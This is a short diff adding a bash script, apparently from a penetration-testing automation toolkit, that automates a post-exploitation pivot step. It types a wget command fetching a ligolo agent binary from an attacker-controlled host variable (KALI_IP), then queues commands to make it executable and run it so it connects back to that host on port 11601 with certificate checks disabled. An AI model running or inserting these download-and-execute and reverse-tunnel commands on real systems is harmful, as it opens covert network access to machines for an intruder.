@@ -1,0 +1,9 @@
+#!/bin/bash
+
+com="wget http://${KALI_IP}/b/e/ligolo/linagent"
+
+type_command "${com}"
+type_newline
+
+add_playbook_cmd "chmod +x ./linagent"
+add_playbook_cmd "./linagent -connect ${KALI_IP}:11601 -ignore-cert"
